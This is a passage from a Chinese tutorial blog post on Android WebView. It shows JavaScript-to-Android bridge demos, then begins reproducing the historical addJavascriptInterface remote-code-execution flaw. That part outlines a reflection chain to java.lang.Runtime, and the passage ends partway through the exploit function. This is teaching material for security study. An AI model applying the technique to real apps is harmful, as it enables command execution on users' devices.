<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/12.png" alt="image-20220729094802205"></p>
<h5 id="lt-2-gt-JS调用Android"><a href="#lt-2-gt-JS调用Android" class="headerlink" title="&lt;2&gt;JS调用Android"></a>&lt;2&gt;JS调用Android</h5><p><strong><code>addJavascriptInterface</code></strong></p>
<p>首先，准备html文件，放到assets中</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//JS调用Android</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa js调用了android中的hello方法&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Click Attack<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/13.png" alt="image-20220729100734122"></p>
<p>然后加载调用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsToAndroActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_to_andro);</span><br><span class="line"></span><br><span class="line">        <span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line">        <span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">        webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class="line">        <span class="comment">//参数1：Javascript对象名</span></span><br><span class="line">        <span class="comment">//参数2：Java对象名</span></span><br><span class="line">        mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载JS代码</span></span><br><span class="line">        <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line">        mWebView.loadUrl(<span class="string">&quot;file:///android_asset/javascript.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">        <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Hello，&quot;</span> + msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们切换到第二个测试用例</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/14.png" alt="image-20220729100854323"></p>
<p>直接点击</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/15.png" alt="image-20220729100914639"></p>
<p>此时已经成功的加载了我们的JS，我们点击按钮</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/16.png" alt="image-20220729101013208"></p>
<p>js中就成功的加载了Android中的hello方法</p>
<p><strong><code>WebViewClient.shouldOverrideUrlLoading ()</code></strong></p>
<p>具体原理：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)Android通过 WebViewClient 的回调方法shouldOverrideUrlLoading ()拦截 url</span><br><span class="line">(<span class="number">2</span>)解析该 url 的协议</span><br><span class="line">(<span class="number">3</span>)如果检测到是预先约定好的协议，就调用相应方法</span><br></pre></td></tr></table></figure>

<p>即JS需要调用Android的方法</p>
<p>具体使用：</p>
<p>首先，在JS中约定所需要的Url协议，以.html格式放到src&#x2F;main&#x2F;assets文件夹里</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Carson_Ho&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">         function <span class="title function_">callAndroid</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="comment">/*约定的url协议为：js://webview?arg1=WindXaa&amp;arg2=attack*/</span></span><br><span class="line">            document.location = <span class="string">&quot;js://webview?arg1=WindXaa&amp;arg2=attack&quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 点击按钮则调用callAndroid（）方法  --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;button type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;button1&quot;</span> onclick=<span class="string">&quot;callAndroid()&quot;</span>&gt;点击调用Android代码&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后我们新建一个类，并编写代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">     <span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview2);</span><br><span class="line"></span><br><span class="line">        <span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">        webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line">        webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 步骤1：加载JS代码</span></span><br><span class="line">        <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line">        mWebView.loadUrl(<span class="string">&quot;file:///android_asset/javascript1.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 复写WebViewClient类的shouldOverrideUrlLoading方法</span></span><br><span class="line">        mWebView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>() &#123;</span><br><span class="line">                                      <span class="meta">@Override</span></span><br><span class="line">                                      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">                                          <span class="comment">// 步骤2：根据协议的参数，判断是否是所需要的url</span></span><br><span class="line">                                          <span class="comment">// 一般根据scheme（协议格式） &amp; authority（协议名）判断（前两个参数）</span></span><br><span class="line">                                          <span class="comment">//约定的url协议为：js://webview?arg1=WindXaa&amp;arg2=attack（同时也是约定好的需要拦截的）</span></span><br><span class="line"></span><br><span class="line">                                          <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(url);</span><br><span class="line">                                          <span class="comment">// 如果url的协议 = 预先约定的 js 协议</span></span><br><span class="line">                                          <span class="comment">// 就解析往下解析参数</span></span><br><span class="line">                                          <span class="keyword">if</span> ( uri.getScheme().equals(<span class="string">&quot;js&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                                              <span class="comment">// 如果 authority  = 预先约定协议里的 webview，即代表都符合约定的协议</span></span><br><span class="line">                                              <span class="comment">// 所以拦截url,下面JS开始调用Android需要的方法</span></span><br><span class="line">                                              <span class="keyword">if</span> (uri.getAuthority().equals(<span class="string">&quot;webview&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                                                  <span class="comment">//  步骤3：</span></span><br><span class="line">                                                  <span class="comment">// 执行JS所需要调用的逻辑</span></span><br><span class="line">                                                  System.out.println(<span class="string">&quot;js调用了Android的方法&quot;</span>);</span><br><span class="line">                                                  <span class="comment">// 可以在协议上带有参数并传递到Android上</span></span><br><span class="line">                                                  HashMap&lt;String, String&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                                                  Set&lt;String&gt; collection = uri.getQueryParameterNames();</span><br><span class="line">                                                  Log.e(<span class="string">&quot;WindXaa&quot;</span>,params.get(<span class="number">0</span>)+<span class="string">&quot;---&quot;</span>+params.get(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                              &#125;</span><br><span class="line"></span><br><span class="line">                                              <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                                          &#125;</span><br><span class="line">                                          <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">                                      &#125;</span><br><span class="line">                                  &#125;</span><br><span class="line">        );</span><br></pre></td></tr></table></figure>

<p>运行程序：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/17.png" alt="image-20220729105941115"></p>
<p>这里就调用Android代码成功</p>
<p> <strong><code>WebChromeClient</code> 的<code>onJsAlert()</code>、<code>onJsConfirm()</code>、<code>onJsPrompt（）</code></strong></p>
<p>在JS中，上面三种方法分别回调l拦截对话框<code>alert()</code>、<code>confirm()</code>、<code>prompt()</code>的信息：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/18.png" alt="image-20220729110247468"></p>
<p>Android通过 <code>WebChromeClient</code> 的<code>onJsAlert()</code>、<code>onJsConfirm()</code>、<code>onJsPrompt（）</code>方法回调分别拦截JS对话框（即上述三个方法），得到他们的消息内容，然后解析即可</p>
<p>然后我们再次编写js代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson_Ho<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">	<span class="keyword">function</span> <span class="title function_">clickprompt</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 调用prompt（）</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> result=<span class="title function_">prompt</span>(<span class="string">&quot;js://webview?arg1=WindXaa&amp;arg2=attack&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>(<span class="string">&quot;demo &quot;</span> + result);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- 点击按钮则调用clickprompt()  --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;clickprompt()&quot;</span>&gt;</span>点击调用Android代码<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>我们编写onJsPrompt 回调方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview3);</span><br><span class="line"></span><br><span class="line">      <span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">      webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">      <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line">      webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 先加载JS代码</span></span><br><span class="line">      <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line">      mWebView.loadUrl(<span class="string">&quot;file:///android_asset/javascript2.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">          <span class="comment">// 拦截输入框(原理同方式2)</span></span><br><span class="line">          <span class="comment">// 参数message:代表promt（）的内容（不是url）</span></span><br><span class="line">          <span class="comment">// 参数result:代表输入框的返回值</span></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsPrompt</span><span class="params">(WebView view, String url, String message, String defaultValue, JsPromptResult result)</span> &#123;</span><br><span class="line">              <span class="comment">// 根据协议的参数，判断是否是所需要的url(原理同方式2)</span></span><br><span class="line">              <span class="comment">// 一般根据scheme（协议格式） &amp; authority（协议名）判断（前两个参数）</span></span><br><span class="line"></span><br><span class="line">              <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(message);</span><br><span class="line">              <span class="comment">// 如果url的协议 = 预先约定的 js 协议</span></span><br><span class="line">              <span class="comment">// 就解析往下解析参数</span></span><br><span class="line">              <span class="keyword">if</span> (uri.getScheme().equals(<span class="string">&quot;js&quot;</span>)) &#123;</span><br><span class="line">                  <span class="comment">//js://webview?arg1=WindXaa&amp;arg2=attack</span></span><br><span class="line">                  <span class="comment">// 如果 authority  = 预先约定协议里的 webview，即代表都符合约定的协议</span></span><br><span class="line">                  <span class="comment">// 所以拦截url,下面JS开始调用Android需要的方法</span></span><br><span class="line">                  <span class="keyword">if</span> (uri.getAuthority().equals(<span class="string">&quot;webview&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                      <span class="comment">// 执行JS所需要调用的逻辑</span></span><br><span class="line">                      System.out.println(<span class="string">&quot;js调用了Android的方法&quot;</span>);</span><br><span class="line">                      <span class="comment">// 可以在协议上带有参数并传递到Android上</span></span><br><span class="line">                      HashMap&lt;String, String&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                      Set&lt;String&gt; collection = uri.getQueryParameterNames();</span><br><span class="line"></span><br><span class="line">                      <span class="comment">//参数result:代表消息框的返回值(输入值)</span></span><br><span class="line">                      result.confirm(<span class="string">&quot;js调用了Android的方法成功啦&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">return</span> <span class="built_in">super</span>.onJsPrompt(view, url, message, defaultValue, result);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure>

<p>运行程序：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/19.png" alt="image-20220729143728889"></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/20.png" alt="image-20220729143746516"></p>
<p>我们可以发现这里已经成功的加载了html，然后我们再次点击按钮可以发现通过回调成功的调用了函数，并且显示了弹窗</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/21.png" alt="image-20220729143927623"></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/22.png" alt="image-20220729144012571"></p>
<p>其余两种方法同理：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拦截JS的警告框</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, JsResult result)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">super</span>.onJsAlert(view, url, message, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拦截JS的确认框</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsConfirm</span><span class="params">(WebView view, String url, String message, JsResult result)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">super</span>.onJsConfirm(view, url, message, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="三、WebView的漏洞面"><a href="#三、WebView的漏洞面" class="headerlink" title="三、WebView的漏洞面"></a>三、WebView的漏洞面</h2><p>WebView 漏洞在Android APP中占比十分巨大，根据梆梆安全的《2021年移动安全形势分析与2022年研判》中显示，WebView漏洞总和仍然占据目前Android APP漏洞类别前列，如下图所示：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/23.png" alt="image-20220729145936266"></p>
<p>因此了解和掌握WebView漏洞的原理和技巧是十分重要的</p>
<h3 id="1-WebView的漏洞面"><a href="#1-WebView的漏洞面" class="headerlink" title="1.WebView的漏洞面"></a>1.WebView的漏洞面</h3><p>谈起WebView漏洞，我们的目光回退到2020年看雪SDC沙龙会议中，来自OPPO实验室的何恩大佬发表的《Android WebView安全攻防指南2020》的演讲，大佬从WebView的<code>本地攻击面、远程攻击面、特殊攻击面</code>共3个角度讲述了WebView漏洞的成因，原文链接：<a target="_blank" rel="noopener" href="https://zhuanlan.kanxue.com/article-14155.htm">Android WebView安全攻防指南2020</a>，这里引用大佬的WebView示例图，如下图所示：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/24.png" alt="image-20220729150558039"></p>
<p>从图中我们可以看出WebView的漏洞攻击面，从引导组件Intent、deeplink，包括了WebView自身的接口，以及一些端口协议等等攻击面</p>
<h3 id="2-WebView漏洞发展总结"><a href="#2-WebView漏洞发展总结" class="headerlink" title="2.WebView漏洞发展总结"></a>2.WebView漏洞发展总结</h3><p>考虑到WebView漏洞的攻击面十分的杂乱，这里我对WebView漏洞的发展进行了一个梳理总结，如下所示：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/25.png" alt="image-20220729152654652"></p>
<p>下面我们就将一一的讲解每个漏洞的原理并进行复现</p>
<h2 id="四、WebView的漏洞原理和复现"><a href="#四、WebView的漏洞原理和复现" class="headerlink" title="四、WebView的漏洞原理和复现"></a>四、WebView的漏洞原理和复现</h2><h3 id="1-历史漏洞"><a href="#1-历史漏洞" class="headerlink" title="1.历史漏洞"></a>1.历史漏洞</h3><h4 id="（1）WebView任意代码执行漏洞"><a href="#（1）WebView任意代码执行漏洞" class="headerlink" title="（1）WebView任意代码执行漏洞"></a>（1）WebView任意代码执行漏洞</h4><h5 id="lt-1-gt-addJavascriptInterface-接口引起远程代码执行漏洞"><a href="#lt-1-gt-addJavascriptInterface-接口引起远程代码执行漏洞" class="headerlink" title="&lt;1&gt; addJavascriptInterface 接口引起远程代码执行漏洞"></a>&lt;1&gt; addJavascriptInterface 接口引起远程代码执行漏洞</h5><p><strong>漏洞原理：</strong></p>
<p>我们在上文中讲述过JS和Android直接的通信可以通过<code>addJavascriptInterface</code>接口进行对象映射</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JSObject</span>(), <span class="string">&quot;myObj&quot;</span>);</span><br><span class="line"><span class="comment">// 参数1：Android的本地对象</span></span><br><span class="line"><span class="comment">// 参数2：JS的对象</span></span><br><span class="line"><span class="comment">// 通过对象映射将Android中的本地对象和JS中的对象进行关联，从而实现JS调用Android的对象和方法</span></span><br></pre></td></tr></table></figure>

<p>当JS拿到Android这个对象后，就可以调用这个Android对象中所有的方法，包括系统类（java.lang.Runtime 类），从而进行任意代码执行。</p>
<p>具体的攻击步骤：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）Android中的对象有一公共的方法：getClass() </span><br><span class="line">（<span class="number">2</span>）该方法可以获取到当前类 类型Class</span><br><span class="line">（<span class="number">3</span>）该类有一关键的方法： Class.forName；</span><br><span class="line">（<span class="number">4</span>）该方法可以加载一个类（可加载 java.lang.Runtime 类）</span><br><span class="line">（<span class="number">5</span>）而该类是可以执行本地命令的</span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">execute</span><span class="params">(cmdArgs)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">// 步骤1：遍历 window 对象</span></span><br><span class="line">    <span class="comment">// 目的是为了找到包含 getClass （）的对象</span></span><br><span class="line">    <span class="comment">// 因为Android映射的JS对象也在window中，所以肯定会遍历到</span></span><br><span class="line">    <span class="keyword">for</span> 